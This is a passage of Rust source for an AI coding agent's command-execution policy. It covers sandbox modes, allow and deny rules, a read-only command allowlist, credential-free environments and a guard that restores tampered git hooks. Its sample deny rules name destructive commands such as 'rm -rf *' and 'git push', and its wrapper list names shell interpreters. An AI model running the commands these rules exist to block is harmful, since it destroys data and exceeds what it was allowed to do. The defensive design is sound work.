//! Code execution for the Builder (`specs/008` §4, `specs/001` §5.1): the `[exec]` policy, the task
//! worktrees, and `run_command`.
//!
//! **The OS sandbox is optional** (D-24). By default commands run directly, as the operator's own
//! process, and the control is the approval card, as in Claude Code: every command asks unless a
//! ratified `allow` rule or the built-in read-only list covers it, and `deny` rules refuse outright.
//! Set `sandbox = "prefer"` to use the sandbox when it exists (sandboxed commands are then Green), or
//! `"required"` to refuse to run anything without it.
//!
//! The `[exec]` table widens what a command may do (rules that skip approval, toolchain paths, the
//! environment), so it is one of the blocks `local/ratified.lock` pins: a local edit of `config.toml`
//! cannot change it until the operator ratifies.
//!
//! ```toml
//! [exec]
//! sandbox = "off"                                 # off (default) | prefer | required
//! merge = "local"                                  # local (default) | pr: push the branch and open a pull request
//! allow = ["cargo test*", "cargo build*"]         # matched against the argv joined by spaces
//! deny = ["rm -rf *", "git push*"]
//! toolchain = ["~/.cargo", "~/.rustup"]          # sandbox only: read-only and executable
//! env = { PATH = "~/.cargo/bin:/usr/bin:/bin", CARGO_TARGET_DIR = "{scratch}/target" }
//! timeout_secs = 600
//! max_output_bytes = 262144
//! host_exec_paths = ["tools/deploy"]
//! test_command = ["cargo", "test", "--offline"]   # merge gate 1
//! check_command = ["cargo", "clippy", "--offline"] # merge gate 2
//! ```
//!
//! Sandboxed, the environment is built from `env` alone (plus `HOME` and `TMPDIR` under the scratch
//! directory) and the network is off. Unsandboxed, the environment is an allowlist taken from the
//! operator's own (`PATH`, `HOME`, locale, toolchain homes) with `env` laid over it: no `AWS_*`, tokens
//! or the like reach a model-chosen command. Placeholders `{scratch}` and
//! `{worktree}` expand to absolute paths.

use crate::worktree::{GitError, Worktree, Worktrees};
use delphi_sandbox::{plain_command, run_bounded, Network, RunOptions, RunOutcome, Sandbox, SandboxSpec};
use std::collections::{BTreeMap, HashMap};
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use std::time::Duration;

/// What approving a finished build does.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MergeMode {
    /// Merge the task branch into the branch you have checked out.
    Local,
    /// Push the task branch to `origin` and open a pull request with `gh`.
    Pr,
}

/// Whether commands run inside the OS sandbox.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SandboxMode {
    /// Never; the approval card is the control (default).
    Off,
    /// When the OS provides one; otherwise as `Off`.
    Prefer,
    /// Always; refuse to run when there is none.
    Required,
}

#[derive(Debug, Clone, PartialEq)]
pub struct ExecConfig {
    pub sandbox: SandboxMode,
    pub merge: MergeMode,
    /// Commands that need no approval (patterns over the argv joined by spaces; `*` matches anything).
    pub allow: Vec<String>,
    /// Commands that are refused outright; checked before `allow`.
    pub deny: Vec<String>,
    pub toolchain: Vec<PathBuf>,
    pub env: BTreeMap<String, String>,
    pub timeout: Duration,
    pub max_output_bytes: usize,
    pub cpu_secs: u64,
    pub scratch_quota_bytes: u64,
    pub host_exec_paths: Vec<String>,
    pub test_command: Option<Vec<String>>,
    pub check_command: Option<Vec<String>>,
}

impl Default for ExecConfig {
    fn default() -> ExecConfig {
        ExecConfig {
            sandbox: SandboxMode::Off,
            merge: MergeMode::Local,
            allow: vec![],
            deny: vec![],
            toolchain: vec![],
            env: BTreeMap::from([("PATH".to_string(), "/usr/bin:/bin:/usr/sbin:/sbin".to_string())]),
            timeout: Duration::from_secs(600),
            max_output_bytes: 256 * 1024,
            cpu_secs: 900,
            scratch_quota_bytes: 2 << 30,
            host_exec_paths: vec![],
            test_command: None,
            check_command: None,
        }
    }
}

/// `~` and `~/x` expanded in every element of a `:`-separated value (a `PATH` has several).
fn expand_home(s: &str, home: &Path) -> String {
    s.split(':')
        .map(|part| {
            if part == "~" {
                home.display().to_string()
            } else if let Some(rest) = part.strip_prefix("~/") {
                home.join(rest).display().to_string()
            } else {
                part.to_string()
            }
        })
        .collect::<Vec<_>>()
        .join(":")
}

fn string_list(v: Option<&toml::Value>) -> Vec<String> {
    v.and_then(|v| v.as_array()).map(|a| a.iter().filter_map(|x| x.as_str().map(String::from)).collect()).unwrap_or_default()
}

impl ExecConfig {
    /// From the effective config's `[sandbox]` table; anything missing keeps its default. `home` is the
    /// operator's home directory (for `~` in toolchain paths).
    pub fn from_root(root: &toml::Value, home: &Path) -> ExecConfig {
        let mut c = ExecConfig::default();
        let Some(t) = root.get("exec") else { return c };
        c.sandbox = match t.get("sandbox").and_then(|v| v.as_str()) {
            Some("prefer") => SandboxMode::Prefer,
            Some("required") => SandboxMode::Required,
            _ => SandboxMode::Off, // unknown values are the safe-to-approve default, not a silent widening
        };
        c.merge = if t.get("merge").and_then(|v| v.as_str()) == Some("pr") { MergeMode::Pr } else { MergeMode::Local };
        c.allow = string_list(t.get("allow"));
        c.deny = string_list(t.get("deny"));
        c.toolchain = string_list(t.get("toolchain")).iter().map(|p| PathBuf::from(expand_home(p, home))).collect();
        if let Some(env) = t.get("env").and_then(|e| e.as_table()) {
            c.env = env.iter().filter_map(|(k, v)| v.as_str().map(|v| (k.clone(), expand_home(v, home)))).collect();
        }
        if let Some(n) = t.get("timeout_secs").and_then(|v| v.as_integer()).filter(|n| *n > 0) {
            c.timeout = Duration::from_secs(n as u64);
        }
        if let Some(n) = t.get("max_output_bytes").and_then(|v| v.as_integer()).filter(|n| *n > 0) {
            c.max_output_bytes = n as usize;
        }
        if let Some(n) = t.get("cpu_secs").and_then(|v| v.as_integer()).filter(|n| *n > 0) {
            c.cpu_secs = n as u64;
        }
        c.host_exec_paths = string_list(t.get("host_exec_paths"));
        let cmd = |k: &str| Some(string_list(t.get(k))).filter(|v| !v.is_empty());
        c.test_command = cmd("test_command");
        c.check_command = cmd("check_command");
        c
    }
}

/// Why `run_command` could not even start.
#[derive(Debug, PartialEq, Eq)]
pub enum ExecError {
    NoSandbox,
    BadArgs(String),
    Io(String),
}

impl std::fmt::Display for ExecError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ExecError::NoSandbox => write!(f, "no OS sandbox is available on this machine, so code is not executed (see `delphi doctor`)"),
            ExecError::BadArgs(m) | ExecError::Io(m) => write!(f, "{}", m),
        }
    }
}

/// Validate `run_command` arguments: a program and its arguments, never a shell string.
pub fn parse_argv(args: &serde_json::Value) -> Result<Vec<String>, ExecError> {
    let list = args["argv"].as_array().ok_or_else(|| ExecError::BadArgs("`argv` must be an array of strings: the program, then its arguments (there is no shell)".into()))?;
    let argv: Vec<String> = list.iter().map(|x| x.as_str().map(String::from)).collect::<Option<_>>().ok_or_else(|| ExecError::BadArgs("`argv` must contain only strings".into()))?;
    if argv.is_empty() || argv.len() > 64 || argv[0].is_empty() {
        return Err(ExecError::BadArgs("`argv` needs 1 to 64 entries, the first being the program".into()));
    }
    if argv.iter().any(|a| a.len() > 4096 || a.contains('\0')) {
        return Err(ExecError::BadArgs("an argument is too long or contains a NUL".into()));
    }
    Ok(argv)
}

/// Modified-file detection without trusting the command: (length, mtime) before and after.
pub(crate) type Snapshot = HashMap<String, (u64, i128)>;

pub(crate) fn snapshot(root: &Path) -> Snapshot {
    fn walk(dir: &Path, root: &Path, out: &mut Snapshot, budget: &mut usize) {
        let Ok(rd) = std::fs::read_dir(dir) else { return };
        for e in rd.flatten() {
            if *budget == 0 {
                return;
            }
            let name = e.file_name();
            if name.to_string_lossy().eq_ignore_ascii_case(".git") {
                continue;
            }
            let Ok(ft) = e.file_type() else { continue };
            if ft.is_dir() {
                walk(&e.path(), root, out, budget);
            } else if ft.is_file() {
                *budget -= 1;
                if let Ok(md) = e.metadata() {
                    let mtime = md.modified().ok().and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok()).map(|d| d.as_nanos() as i128).unwrap_or(0);
                    out.insert(e.path().strip_prefix(root).unwrap_or(&e.path()).display().to_string(), (md.len(), mtime));
                }
            }
        }
    }
    let mut out = Snapshot::new();
    let mut budget = 200_000usize;
    walk(root, root, &mut out, &mut budget);
    out
}

/// Files in `after` that are new or differ from `before`, in path order.
pub(crate) fn changed(before: &Snapshot, after: &Snapshot) -> Vec<String> {
    let mut v: Vec<String> = after.iter().filter(|(p, meta)| before.get(*p) != Some(*meta)).map(|(p, _)| p.clone()).collect();
    v.sort();
    v
}

/// A copy of the small files that decide what git executes (hooks, config, attributes), taken before a
/// command that is not sandboxed. A command that changes them is planting something that would run the
/// next time the operator commits, so the change is undone and reported.
///
/// Everything is judged without following symlinks: a hook that is a symlink (dangling or not) is not a file
/// we can trust, and restoring never writes through one.
pub struct GitGuard {
    /// Regular files we could read: (path, contents, mode).
    files: Vec<(PathBuf, Vec<u8>, u32)>,
    /// Every path that existed at the snapshot, readable or not. Only paths outside this set are "added".
    existed: std::collections::HashSet<PathBuf>,
    roots: Vec<PathBuf>,
}

impl GitGuard {
    const MAX_FILE: u64 = 256 * 1024;

    /// Entries directly inside a directory root (any type but a directory), or the root itself if it is a file or link.
    fn entries(root: &Path) -> Vec<PathBuf> {
        match std::fs::symlink_metadata(root) {
            Ok(md) if md.is_dir() => std::fs::read_dir(root).map(|rd| rd.flatten().map(|e| e.path()).filter(|p| std::fs::symlink_metadata(p).is_ok_and(|m| !m.is_dir())).collect()).unwrap_or_default(),
            Ok(_) => vec![root.to_path_buf()],
            Err(_) => vec![],
        }
    }

    pub fn snapshot(roots: &[PathBuf]) -> GitGuard {
        use std::os::unix::fs::PermissionsExt;
        let (mut files, mut existed) = (Vec::new(), std::collections::HashSet::new());
        for r in roots {
            for p in Self::entries(r) {
                existed.insert(p.clone());
                let Ok(md) = std::fs::symlink_metadata(&p) else { continue };
                if md.is_file() && md.len() <= Self::MAX_FILE {
                    if let Ok(bytes) = std::fs::read(&p) {
                        files.push((p, bytes, md.permissions().mode()));
                    }
                }
            }
        }
        GitGuard { files, existed, roots: roots.to_vec() }
    }

    /// Put everything back as it was; returns the paths that had been changed, added or removed.
    pub fn restore(&self) -> Vec<String> {
        use std::os::unix::fs::PermissionsExt;
        let mut touched = Vec::new();
        for r in &self.roots {
            for p in Self::entries(r) {
                // New since the snapshot (a file, or a link of any kind): remove it. Pre-existing files we could not
                // snapshot (too large, unreadable) are left alone, never deleted.
                if !self.existed.contains(&p) && std::fs::remove_file(&p).is_ok() {
                    touched.push(p.display().to_string());
                }
            }
        }
        for (p, bytes, mode) in &self.files {
            let is_link = std::fs::symlink_metadata(p).is_ok_and(|m| m.file_type().is_symlink());
            let same = !is_link && std::fs::read(p).map(|now| now == *bytes).unwrap_or(false);
            if same {
                continue;
            }
            if is_link {
                let _ = std::fs::remove_file(p); // never write through a link
            }
            if let Some(parent) = p.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            if std::fs::write(p, bytes).is_ok() {
                let _ = std::fs::set_permissions(p, std::fs::Permissions::from_mode(*mode));
            }
            touched.push(p.display().to_string());
        }
        touched.sort();
        touched
    }
}

/// What the policy says about a command before anything asks the operator.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Verdict {
    /// Runs without a card, and why.
    Allowed(&'static str),
    /// The operator is asked.
    Ask,
    Refused(String),
}

/// `*` matches any run of characters; everything else is literal.
pub fn glob_match(pattern: &str, text: &str) -> bool {
    let parts: Vec<&str> = pattern.split('*').collect();
    if parts.len() == 1 {
        return pattern == text;
    }
    let (first, last) = (parts[0], parts[parts.len() - 1]);
    if !text.starts_with(first) || text.len() < first.len() + last.len() || !text.ends_with(last) {
        return false;
    }
    let mut pos = first.len();
    let end = text.len() - last.len();
    for mid in &parts[1..parts.len() - 1] {
        match text[pos..end].find(mid) {
            Some(i) => pos += i + mid.len(),
            None => return false,
        }
    }
    true
}

/// Programs that run other programs or interpret code: a rule written for `sh` or `env` would pass
/// anything, so rules never match them and the card is always raised.
const WRAPPERS: [&str; 22] = ["sh", "bash", "zsh", "dash", "fish", "ksh", "env", "xargs", "sudo", "doas", "nice", "time", "timeout", "nohup", "exec", "eval", "python", "python3", "node", "perl", "ruby", "su"];

fn base(program: &str) -> &str {
    program.rsplit('/').next().unwrap_or(program)
}

/// A path argument that stays inside the working directory: relative, no `..`, no `~`, no variables.
pub fn in_tree(arg: &str) -> bool {
    !arg.starts_with('/') && !arg.starts_with('~') && !arg.contains('$') && !arg.contains('`') && !arg.split('/').any(|c| c == "..")
}

/// Split a command string into words, honoring single and double quotes. `None` when it has anything a
/// shell would interpret beyond that (operators, redirects, expansions, escapes, subshells, globs in the
/// program position are fine as data but `$`, backticks and parentheses are not).
pub fn shell_words(line: &str) -> Option<Vec<String>> {
    let mut words = Vec::new();
    let mut cur = String::new();
    let mut have = false;
    let mut quote: Option<char> = None;
    for c in line.chars() {
        match (quote, c) {
            (Some(q), c) if c == q => quote = None,
            (Some('\''), c) => cur.push(c),
            (Some(_), '$' | '`' | '\\') => return None,
            (Some(_), c) => cur.push(c),
            (None, '\'' | '"') => {
                quote = Some(c);
                have = true;
            }
            (None, ';' | '|' | '&' | '<' | '>' | '$' | '`' | '(' | ')' | '\\' | '\n' | '\r' | '{' | '}') => return None,
            (None, c) if c.is_whitespace() => {
                if have {
                    words.push(std::mem::take(&mut cur));
                    have = false;
                }
            }
            (None, c) => {
                cur.push(c);
                have = true;
            }
        }
    }
    if quote.is_some() {
        return None;
    }
    if have {
        words.push(cur);
    }
    Some(words)
}

/// The only flags a read-only command may carry: single-letter flags (alone or combined, with no attached value)
/// and exact long flags. Anything else, including `-oFILE`, `--out=FILE` and getopt abbreviations, is not allowed,
/// so a flag cannot smuggle in an output file or an outside input file.
struct Flags {
    short: &'static str,
    long: &'static [&'static str],
}

impl Flags {
    fn ok(&self, arg: &str) -> bool {
        if let Some(l) = arg.strip_prefix("--") {
            !l.contains('=') && self.long.contains(&arg)
        } else if let Some(letters) = arg.strip_prefix('-') {
            !letters.is_empty() && letters.chars().all(|c| self.short.contains(c))
        } else {
            true // a positional
        }
    }
}

/// `-name '*.rs'` style options of `find`.
const FIND_OPTS: [&str; 11] = ["-name", "-iname", "-type", "-maxdepth", "-mindepth", "-path", "-ipath", "-print", "-not", "-empty", "-size"];

/// Read-only commands that need no card, like Claude Code's built-in list: every flag is on a per-command
/// allowlist, every positional is a path inside the worktree, and (given the worktree root) no path resolves
/// through a symlink to somewhere else.
pub fn is_safe_read_only(argv: &[String], root: Option<&Path>) -> bool {
    let prog = base(&argv[0]);
    let args = &argv[1..];
    let flags = |f: &Flags| args.iter().all(|a| f.ok(a));
    let positionals = |skip: usize| args.iter().skip(skip).filter(|a| !a.starts_with('-'));
    let tree = |skip: usize| positionals(skip).all(|a| in_tree(a) && stays_inside(root, a));
    match prog {
        "ls" => flags(&Flags { short: "alhRtSrdFA1", long: &["--all", "--almost-all", "--human-readable"] }) && tree(0),
        "cat" => flags(&Flags { short: "nbsA", long: &[] }) && tree(0),
        "head" | "tail" => flags(&Flags { short: "nc", long: &[] }) && tree(0),
        "wc" => flags(&Flags { short: "lwcm", long: &[] }) && tree(0),
        "file" => flags(&Flags { short: "bi", long: &[] }) && tree(0),
        "diff" => flags(&Flags { short: "uqwr", long: &[] }) && tree(0),
        "sort" => flags(&Flags { short: "rnubk", long: &[] }) && tree(0),
        "stat" | "basename" | "dirname" => flags(&Flags { short: "", long: &[] }) && tree(0),
        "pwd" | "true" => args.is_empty(),
        "echo" => true,
        "grep" | "rg" => {
            // The pattern can be any text; only the flags and the paths are constrained. A flag that takes the
            // pattern (`-e`) is followed by free text, so positionals here are checked as paths only when they
            // exist on disk.
            flags(&Flags { short: "inlLcvwEFHhoasqxeABCr", long: &["--ignore-case", "--line-number", "--files-with-matches", "--count", "--no-heading", "--hidden"] }) && positionals(0).all(|a| a.chars().all(|c| c != '\0') && (!Path::new(a).exists() || (in_tree(a) && stays_inside(root, a))) && !a.starts_with('/') && !a.split('/').any(|c| c == ".."))
        }
        "find" => args.iter().enumerate().all(|(i, a)| if a.starts_with('-') { FIND_OPTS.contains(&a.as_str()) } else { (i == 0 || args[i - 1].starts_with('-') || in_tree(a)) && (args[..i].iter().any(|p| p.starts_with('-')) || (in_tree(a) && stays_inside(root, a))) || args[i.saturating_sub(1)].starts_with('-') }),
        "git" => {
            const SUB: [&str; 7] = ["status", "diff", "log", "show", "rev-parse", "ls-files", "branch"];
            let Some(sub) = args.first() else { return false };
            if !SUB.contains(&sub.as_str()) {
                return false;
            }
            let f = Flags {
                short: "sbalrvnp",
                long: &["--short", "--porcelain", "--branch", "--oneline", "--stat", "--name-only", "--name-status", "--cached", "--staged", "--shortstat", "--graph", "--decorate", "--list", "--show-current", "--all", "--abbrev-ref", "--no-pager", "--no-color", "--show-toplevel", "--verify", "--no-patch"],
            };
            let branch_ok = sub != "branch" || args.iter().skip(1).filter(|a| a.starts_with('-')).all(|a| matches!(a.as_str(), "--list" | "-l" | "-a" | "-r" | "-v" | "--show-current" | "--all"));
            branch_ok && args.iter().skip(1).all(|a| f.ok(a)) && tree(1)
        }
        _ => false,
    }
}

/// With a worktree root: the path, if it exists, must resolve to somewhere inside it (no symlink out).
fn stays_inside(root: Option<&Path>, arg: &str) -> bool {
    let Some(root) = root else { return true };
    let Ok(real_root) = std::fs::canonicalize(root) else { return false };
    match std::fs::canonicalize(root.join(arg)) {
        Ok(real) => real.starts_with(&real_root),
        Err(_) => true, // does not exist (yet): nothing to read through
    }
}

#[derive(Debug)]
pub struct CommandReport {
    pub outcome: RunOutcome,
    /// Ran inside the OS sandbox (no network, confined files) rather than directly.
    pub sandboxed: bool,
    /// Git hooks, config or attributes the command changed; they were put back.
    pub tampered: Vec<String>,
    /// Paths (relative to the worktree) the command created or modified.
    pub changed: Vec<String>,
    pub elapsed: Duration,
}

pub struct ExecEnv {
    pub sandbox: Option<Sandbox>,
    pub cfg: ExecConfig,
    pub worktrees: Worktrees,
    scratch_root: PathBuf,
    live: Mutex<HashMap<String, Worktree>>,
}

impl ExecEnv {
    /// `ws_dir` is the workspace home; worktrees live in `<ws>/worktrees`, scratch space in `<ws>/scratch`.
    pub fn new(ws_dir: &Path, cfg: ExecConfig, sandbox: Option<Sandbox>) -> ExecEnv {
        ExecEnv { sandbox, cfg, worktrees: Worktrees::new(&ws_dir.join("worktrees")), scratch_root: ws_dir.join("scratch"), live: Mutex::new(HashMap::new()) }
    }

    /// The worktree for a task: already known, or re-adopted after a restart, or created from `project`.
    /// The flag says a new one was cut just now.
    pub fn ensure(&self, task_id: &str, project: &Path) -> Result<(Worktree, bool), GitError> {
        if let Some(w) = self.live.lock().unwrap().get(task_id) {
            return Ok((w.clone(), false));
        }
        let (wt, created) = match self.worktrees.adopt(task_id) {
            Ok(w) => (w, false),
            Err(_) => (self.worktrees.create(project, task_id)?, true),
        };
        self.live.lock().unwrap().insert(task_id.to_string(), wt.clone());
        Ok((wt, created))
    }

    pub fn worktree_for(&self, task_id: &str, project: &Path) -> Result<Worktree, GitError> {
        self.ensure(task_id, project).map(|(w, _)| w)
    }

    pub fn known_worktree(&self, task_id: &str) -> Option<Worktree> {
        self.live.lock().unwrap().get(task_id).cloned()
    }

    pub fn forget(&self, task_id: &str) {
        self.live.lock().unwrap().remove(task_id);
    }

    pub fn scratch_for(&self, task_id: &str) -> PathBuf {
        self.scratch_root.join(task_id)
    }

    /// The sandbox commands will actually use, per the configured mode.
    pub fn active_sandbox(&self) -> Option<&Sandbox> {
        match self.cfg.sandbox {
            SandboxMode::Off => None,
            SandboxMode::Prefer | SandboxMode::Required => self.sandbox.as_ref(),
        }
    }

    /// Can commands run at all under the configured mode?
    pub fn can_run(&self) -> Result<(), ExecError> {
        if self.cfg.sandbox == SandboxMode::Required && self.sandbox.is_none() {
            return Err(ExecError::NoSandbox);
        }
        Ok(())
    }

    /// What the policy says about `argv` before the operator is asked: deny rules first, then the sandbox
    /// (Green when active), allow rules, and the built-in read-only list.
    pub fn verdict(&self, argv: &[String]) -> Verdict {
        self.verdict_at(argv, None)
    }

    /// As [`ExecEnv::verdict`], with the worktree the command will run in (so the read-only list can refuse
    /// paths that resolve outside it through a symlink).
    pub fn verdict_at(&self, argv: &[String], root: Option<&Path>) -> Verdict {
        self.judge(argv, root, self.active_sandbox().is_some())
    }

    /// As [`ExecEnv::verdict`] for a shell command string, which is what the Claude CLI's Bash tool sends.
    /// The CLI's shell is not ours to sandbox, so it is judged as unsandboxed. A string with any shell syntax
    /// beyond plain words and quotes (`;`, `|`, `&`, redirects, expansions, subshells) can never be allowed
    /// by a rule or the read-only list; it asks. Deny rules are checked against every segment.
    pub fn verdict_line(&self, line: &str) -> Verdict {
        self.verdict_line_at(line, None)
    }

    pub fn verdict_line_at(&self, line: &str, root: Option<&Path>) -> Verdict {
        for seg in line.split([';', '|', '&', '\n']) {
            let seg = seg.trim();
            let words = shell_words(seg).unwrap_or_else(|| seg.split_whitespace().map(String::from).collect());
            if let Some(why) = self.denied(&words, seg) {
                return Verdict::Refused(why);
            }
        }
        match shell_words(line) {
            Some(argv) if !argv.is_empty() => self.judge(&argv, root, false),
            _ => Verdict::Ask,
        }
    }

    /// The several spellings a deny rule must catch: the line as written, with the program's directory removed and
    /// lowercased (case-insensitive volumes), and with git's global options (`-C x`, `-c k=v`, `--no-pager`, …)
    /// taken out, so `/usr/bin/git -C . push` is still `git push`.
    fn deny_forms(argv: &[String], raw: &str) -> Vec<String> {
        let mut forms = vec![raw.to_string()];
        if argv.is_empty() {
            return forms;
        }
        let prog = base(&argv[0]).to_lowercase();
        let mut stripped: Vec<&str> = vec![prog.as_str()];
        stripped.extend(argv[1..].iter().map(String::as_str));
        forms.push(stripped.join(" "));
        if prog == "git" {
            let mut rest = Vec::new();
            let mut it = argv[1..].iter();
            while let Some(a) = it.next() {
                match a.as_str() {
                    "-C" | "-c" | "--git-dir" | "--work-tree" | "--namespace" | "--exec-path" => {
                        it.next();
                    }
                    "--no-pager" | "--paginate" | "-p" | "--bare" | "--no-replace-objects" | "--literal-pathspecs" => {}
                    x if x.starts_with("--git-dir=") || x.starts_with("--work-tree=") || x.starts_with("-c") && x.len() > 2 => {}
                    x => rest.push(x),
                }
            }
            forms.push(format!("git {}", rest.join(" ")));
        }
        forms
    }

    fn denied(&self, argv: &[String], raw: &str) -> Option<String> {
        let forms = Self::deny_forms(argv, raw);
        let d = self.cfg.deny.iter().find(|d| forms.iter().any(|f| glob_match(d, f) || glob_match(&d.to_lowercase(), &f.to_lowercase())))?;
        Some(format!("`{}` matches the deny rule `{}`", raw.chars().take(120).collect::<String>(), d))
    }

    fn judge(&self, argv: &[String], root: Option<&Path>, sandboxed: bool) -> Verdict {
        let line = argv.join(" ");
        if let Some(why) = self.denied(argv, &line) {
            return Verdict::Refused(why);
        }
        if sandboxed {
            return Verdict::Allowed("sandboxed");
        }
        let wrapper = WRAPPERS.contains(&base(&argv[0]));
        if !wrapper && self.cfg.allow.iter().any(|a| glob_match(a, &line)) {
            return Verdict::Allowed("allow rule");
        }
        if is_safe_read_only(argv, root) {
            return Verdict::Allowed("read-only command inside the worktree");
        }
        Verdict::Ask
    }

    /// The environment for a command that is not sandboxed: an allowlist from the operator's own, with the
    /// `[exec] env` table laid over it.
    fn plain_env(&self, wt: &Path, scratch: &Path) -> BTreeMap<String, String> {
        const KEEP: [&str; 14] = ["PATH", "HOME", "USER", "LOGNAME", "SHELL", "LANG", "TERM", "TMPDIR", "CARGO_HOME", "RUSTUP_HOME", "GOPATH", "GOROOT", "NVM_DIR", "VIRTUAL_ENV"];
        let mut env: BTreeMap<String, String> = std::env::vars().filter(|(k, _)| KEEP.contains(&k.as_str()) || k.starts_with("LC_")).collect();
        let sub = |s: &str| s.replace("{scratch}", &scratch.display().to_string()).replace("{worktree}", &wt.display().to_string());
        env.extend(self.cfg.env.iter().map(|(k, v)| (k.clone(), sub(v))));
        env.entry("PATH".into()).or_insert_with(|| "/usr/bin:/bin:/usr/sbin:/sbin".into());
        env
    }

    fn spec(&self, wt: &Path, scratch: &Path) -> Result<SandboxSpec, ExecError> {
        for d in ["home", "tmp", "target"] {
            std::fs::create_dir_all(scratch.join(d)).map_err(|e| ExecError::Io(e.to_string()))?;
        }
        let scratch = std::fs::canonicalize(scratch).map_err(|e| ExecError::Io(e.to_string()))?;
        let mut spec = SandboxSpec::new();
        spec.worktree = Some(wt.to_path_buf());
        spec.scratch = vec![scratch.clone()];
        spec.read_only.extend(self.cfg.toolchain.iter().filter(|p| p.exists()).cloned());
        spec.network = Network::Off;
        spec.limits.cpu_secs = Some(self.cfg.cpu_secs);
        let sub = |s: &str| s.replace("{scratch}", &scratch.display().to_string()).replace("{worktree}", &wt.display().to_string());
        spec.env = self.cfg.env.iter().map(|(k, v)| (k.clone(), sub(v))).collect();
        for (k, v) in [("HOME", scratch.join("home")), ("TMPDIR", scratch.join("tmp"))] {
            spec.env.entry(k.to_string()).or_insert_with(|| v.display().to_string());
        }
        spec.env.entry("CARGO_TARGET_DIR".into()).or_insert_with(|| scratch.join("target").display().to_string());
        Ok(spec)
    }

    /// Run `argv` in the worktree: under the sandbox when the mode says so and one exists, directly otherwise.
    /// Blocking; call from `spawn_blocking`. Approval is the caller's business (see [`ExecEnv::verdict`]).
    pub fn run(&self, wt: &Worktree, argv: &[String], timeout: Option<Duration>) -> Result<CommandReport, ExecError> {
        self.can_run()?;
        let scratch = self.scratch_for(&wt.task_id);
        let sandbox = self.active_sandbox();
        let mut cmd = match sandbox {
            Some(sb) => {
                let spec = self.spec(&wt.path, &scratch)?;
                sb.command(&spec, &argv[0], &argv[1..]).map_err(|e| ExecError::Io(e.to_string()))?
            }
            None => {
                std::fs::create_dir_all(&scratch).map_err(|e| ExecError::Io(e.to_string()))?;
                let limits = delphi_sandbox::Limits { cpu_secs: Some(self.cfg.cpu_secs), ..Default::default() };
                plain_command(limits, &self.plain_env(&wt.path, &scratch), &argv[0], &argv[1..])
            }
        };
        cmd.current_dir(&wt.path);
        // Without the sandbox nothing stops a command writing hooks into the project's .git: watch for it.
        let guard = sandbox.is_none().then(|| GitGuard::snapshot(&wt.git_internals()));
        let before = snapshot(&wt.path);
        let started = std::time::Instant::now();
        let opts = RunOptions { timeout: timeout.unwrap_or(self.cfg.timeout).min(self.cfg.timeout), max_output_bytes: self.cfg.max_output_bytes, quota: vec![(scratch.clone(), self.cfg.scratch_quota_bytes)] };
        let outcome = run_bounded(cmd, &opts).map_err(|e| ExecError::Io(format!("could not start `{}`: {}", argv[0], e)))?;
        let tampered = guard.map(|g| g.restore()).unwrap_or_default();
        let after = snapshot(&wt.path);
        Ok(CommandReport { outcome, sandboxed: sandbox.is_some(), tampered, changed: changed(&before, &after), elapsed: started.elapsed() })
    }
}

/// What the model sees: the exit status and the output, tails kept when long.
pub fn render(report: &CommandReport, argv: &[String]) -> (String, bool) {
    let o = &report.outcome;
    let tail = |s: &str, n: usize| -> String {
        if s.len() <= n {
            s.to_string()
        } else {
            let mut start = s.len() - n;
            while !s.is_char_boundary(start) {
                start += 1;
            }
            format!("… ({} bytes omitted)\n{}", start, &s[start..])
        }
    };
    let status = if o.timed_out {
        "timed out and was killed".to_string()
    } else if o.output_capped {
        "produced more output than allowed and was killed".to_string()
    } else {
        match o.status.map(|s| (s.code(), std::os::unix::process::ExitStatusExt::signal(&s))) {
            Some((Some(0), _)) => "exit 0".to_string(),
            Some((Some(c), _)) => format!("exit {}", c),
            Some((None, Some(sig))) => format!("killed by signal {}", sig),
            _ => "ended without a status".to_string(),
        }
    };
    let mut text = format!("$ {}\n[{}, {:.1}s, {}]\n", argv.join(" "), status, report.elapsed.as_secs_f64(), if report.sandboxed { "sandboxed, no network" } else { "not sandboxed" });
    if !report.tampered.is_empty() {
        text.push_str(&format!("[WARNING: the command changed git hooks or config, which would run on the operator's machine; {} file(s) were restored. Do not do that.]\n", report.tampered.len()));
    }
    if !o.stdout.is_empty() {
        text.push_str(&format!("--- stdout ---\n{}\n", tail(&o.stdout, 12_000)));
    }
    if !o.stderr.is_empty() {
        text.push_str(&format!("--- stderr ---\n{}\n", tail(&o.stderr, 6_000)));
    }
    if !report.changed.is_empty() {
        text.push_str(&format!("[{} file(s) in the worktree created or changed]\n", report.changed.len()));
    }
    if !o.over_quota.is_empty() {
        text.push_str("[scratch space is over its quota]\n");
    }
    (text, !o.success() || !report.tampered.is_empty())
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use std::fs;

    pub(crate) struct Fx {
        pub _d: tempfile::TempDir,
        pub env: ExecEnv,
        pub project: PathBuf,
        pub ws: PathBuf,
    }

    pub(crate) fn fx() -> Fx {
        let d = tempfile::tempdir().unwrap();
        let root = fs::canonicalize(d.path()).unwrap();
        let project = crate::worktree::tests::project(&root);
        let ws = root.join("ws");
        fs::create_dir_all(&ws).unwrap();
        let env = ExecEnv::new(&ws, ExecConfig { sandbox: SandboxMode::Prefer, ..ExecConfig::default() }, Sandbox::detect().ok());
        Fx { _d: d, env, project, ws }
    }

    fn argv(v: &[&str]) -> Vec<String> {
        v.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn config_reads_the_sandbox_table_and_expands_home_and_placeholders() {
        let root: toml::Value = toml::from_str("[exec]\nsandbox = \"prefer\"\nallow = [\"cargo test*\"]\ndeny = [\"rm -rf*\"]\ntoolchain = [\"~/.cargo\", \"/opt/tc\"]\nenv = { PATH = \"~/.cargo/bin:/usr/bin\", X = \"{scratch}/x\" }\ntimeout_secs = 90\nhost_exec_paths = [\"tools\"]\ntest_command = [\"cargo\", \"test\"]\n").unwrap();
        let c = ExecConfig::from_root(&root, Path::new("/op-home"));
        assert_eq!(c.toolchain, [PathBuf::from("/op-home/.cargo"), PathBuf::from("/opt/tc")]);
        assert_eq!(c.env["PATH"], "/op-home/.cargo/bin:/usr/bin");
